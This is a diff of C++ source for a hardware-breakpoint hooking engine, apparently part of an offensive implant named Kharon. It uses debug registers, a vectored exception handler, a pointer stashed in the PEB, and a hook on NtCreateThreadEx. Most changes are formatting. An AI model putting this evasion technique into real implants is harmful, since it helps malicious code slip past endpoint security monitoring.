@@ -22,39 +22,30 @@ auto DECLFN HwbpEng::Install(
 ) -> BOOL {
     if ( Drx < 0 || Drx > 3 ) return FALSE;
 
-    PDESCRIPTOR_HOOK NewEntry = (PDESCRIPTOR_HOOK)Self->Hp->Alloc(sizeof(DESCRIPTOR_HOOK));
+    PDESCRIPTOR_HOOK NewEntry = (PDESCRIPTOR_HOOK)Self->Hp->Alloc( sizeof(DESCRIPTOR_HOOK) );
     if ( !NewEntry ) return FALSE;
 
-    NewEntry->Drx = Drx;
+    NewEntry->Drx      = Drx;
     NewEntry->ThreadID = ThreadID;
-    NewEntry->Address = Address;
-    NewEntry->Detour = (decltype(NewEntry->Detour))Callback;
-    NewEntry->This = this;
-    NewEntry->Next = nullptr;
-    NewEntry->Prev = nullptr;
+    NewEntry->Address  = Address;
+    NewEntry->Detour   = (decltype(NewEntry->Detour))Callback;
+    NewEntry->This     = this;
+    NewEntry->Next     = nullptr;
+    NewEntry->Prev     = nullptr;
 
+    Self->Ntdll.RtlEnterCriticalSection( CritSec );
 
-    Self->Ntdll.RtlEnterCriticalSection(CritSec);
-
-
-    if (!Threads) {
-
+    if ( !Threads ) {
         Threads = NewEntry;
-
     } else {
-
         PDESCRIPTOR_HOOK Current = Threads;
 
         while (Current->Next) {
-    
             Current = Current->Next;
-    
         }
 
-        Current->Next = NewEntry;
-
+        Current->Next  = NewEntry;
         NewEntry->Prev = Current;
-
     }
 
     Self->Ntdll.RtlLeaveCriticalSection( CritSec);
@@ -89,10 +80,10 @@ auto DECLFN HwbpEng::SetBreak(
 
     if (Init) {
         (&Ctx.Dr0)[Drx] = Address;
-        Ctx.Dr7 = SetDr7(Ctx.Dr7, 3, (Drx * 2), 2); // Ativa breakpoint
+        Ctx.Dr7 = SetDr7(Ctx.Dr7, 3, (Drx * 2), 2); // active breakpoint
     } else {
         (&Ctx.Dr0)[Drx] = 0;
-        Ctx.Dr7 = SetDr7(Ctx.Dr7, 0, (Drx * 2), 2); // Desativa breakpoint
+        Ctx.Dr7 = SetDr7(Ctx.Dr7, 0, (Drx * 2), 2); // desactive breakpoint
     }
 
     Status = Self->Ntdll.NtSetContextThread(Handle, &Ctx);
@@ -290,8 +281,6 @@ auto DECLFN HwbpEng::Init( VOID ) -> BOOL {
 
     }
 
-    NtCurrentPeb()->TelemetryCoverageHeader = (PTELEMETRY_COVERAGE_HEADER)this;
-
     Handler = Self->Ntdll.RtlAddVectoredExceptionHandler( 
         1, (PVECTORED_EXCEPTION_HANDLER)this->MainThunk
     );
@@ -311,12 +300,10 @@ auto DECLFN HwbpEng::Clean( VOID ) -> BOOL {
     PDESCRIPTOR_HOOK Current = Threads;
 
     while ( Current ) {
-
         PDESCRIPTOR_HOOK Next = Current->Next; 
-        Uninstall( Current->Address, Current->ThreadID );
+        this->Uninstall( Current->Address, Current->ThreadID );
 
         Current = Next; 
-
     }
 
     Self->Ntdll.RtlLeaveCriticalSection( CritSec );
@@ -350,16 +337,12 @@ auto DECLFN HwbpEng::MainHandler(
                 goto _KH_END;
             }
     
-    
             VOID ( *Detour )( PCONTEXT, PVOID ) = Current->Detour;
             Detour( e->ContextRecord, this );
-    
     
             if ( ! this->SetBreak( Self->Session.ThreadID, Current->Address, Current->Drx, TRUE ) ) {
                 goto _KH_END;
             }
-
-    
     
             Current->Processed = TRUE;
         }
@@ -431,7 +414,8 @@ auto DECLFN HwbpEng::NtCreateThreadExHkThunk(
     _In_ PCONTEXT Ctx,
     _In_ PVOID    This 
 ) -> VOID {
-    static_cast<HwbpEng*>( This )->NtCreateThreadExHk( Ctx );
+    This = NtCurrentPeb()->TelemetryCoverageHeader;
+    return static_cast<Root::Kharon*>( This )->Hw->NtCreateThreadExHk( Ctx );
 }
 
 auto DECLFN HwbpEng::DotnetInit( VOID ) -> BOOL {
